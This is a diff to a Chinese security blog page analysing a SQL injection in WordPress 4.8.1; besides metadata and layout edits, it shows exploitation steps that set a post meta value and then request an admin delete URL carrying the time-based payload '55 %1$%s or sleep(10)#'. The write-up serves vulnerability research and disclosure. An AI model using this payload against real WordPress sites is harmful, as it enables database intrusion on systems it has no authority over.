@@ -15,7 +15,7 @@
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://blog.vulspy.com/2017/09/03/Wordpress-SQL-Injection-Analysis-2/4.1.1.png">
 <meta property="og:image" content="http://blog.vulspy.com/2017/09/03/Wordpress-SQL-Injection-Analysis-2/4.2.1.png">
-<meta property="og:updated_time" content="2017-09-05T10:37:50.713Z">
+<meta property="og:updated_time" content="2017-09-07T05:45:31.912Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Wordpress SQL注入分析（二）">
 <meta name="twitter:description" content="作者：Ambulong@VulSpy  Wordpress SQL注入分析（一） Wordpress SQL注入分析（二）  在上一篇文章 Wordpress SQL注入分析（一） 中，我们分析了Wordpress中的prepare函数在什么情况下会产生SQL注入漏洞。本篇文章将分析我们在Wordpress中发现的一处SQL注入。 当前最新版：Wordpress 4.8.1 第三章：发现Wordp">
@@ -138,11 +138,15 @@
 <li><a href="/2017/09/05/Wordpress-POST-META-Check-Bypass/">Wordpress POST META_NAME校验绕过</a></li>
 </ul>
 <h3 id="3-3-SQL注入漏洞利用"><a href="#3-3-SQL注入漏洞利用" class="headerlink" title="3.3 SQL注入漏洞利用"></a>3.3 SQL注入漏洞利用</h3><ol>
-<li><p>添加媒体（/wp-admin/media-new.php），并记住媒体ID（这里的ID是55）。<br><img src="4.1.1.png" alt="添加媒体"></p>
-</li>
-<li><p>获取_wpnonce。<br>打开<code>/wp-admin/edit.php?post_type=post</code>，找到posts-filter内的_wpnonce（这里的_wpnonce是301ee97c09）<br><img src="4.2.1.png" alt="添加媒体"></p>
-</li>
-<li><p>添加/修改POST META，使存在meta_key为’wp_postmeta’的meta_value为<code>&#39;55 %1$%s or sleep(10)#&#39;</code></p>
+<li>添加媒体（/wp-admin/media-new.php），并记住媒体ID（这里的ID是55）。</li>
+</ol>
+<img src="/2017/09/03/Wordpress-SQL-Injection-Analysis-2/4.1.1.png" alt="添加媒体" title="添加媒体">
+<ol>
+<li>获取_wpnonce。<br>打开<code>/wp-admin/edit.php?post_type=post</code>，找到posts-filter内的_wpnonce（这里的_wpnonce是301ee97c09）</li>
+</ol>
+<img src="/2017/09/03/Wordpress-SQL-Injection-Analysis-2/4.2.1.png" alt="添加媒体" title="添加媒体">
+<ol>
+<li><p>添加/修改POST META，使存在meta_key为’_thumbnail_id’的meta_value为<code>&#39;55 %1$%s or sleep(10)#&#39;</code></p>
 </li>
 <li><p>访问<code>/wp-admin/edit.php?action=delete&amp;_wpnonce=301ee97c09&amp;ids=55 %1$%s or sleep(10)#</code>，触发SQL注入漏洞</p>
 </li>
@@ -151,7 +155,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://blog.vulspy.com/2017/09/03/Wordpress-SQL-Injection-Analysis-2/" data-id="cj77gpj9n0008d3pvqay715xf" class="article-share-link">Share</a>
+      <a data-url="http://blog.vulspy.com/2017/09/03/Wordpress-SQL-Injection-Analysis-2/" data-id="cj7a2lf8z0005cnpvld8lhvxj" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
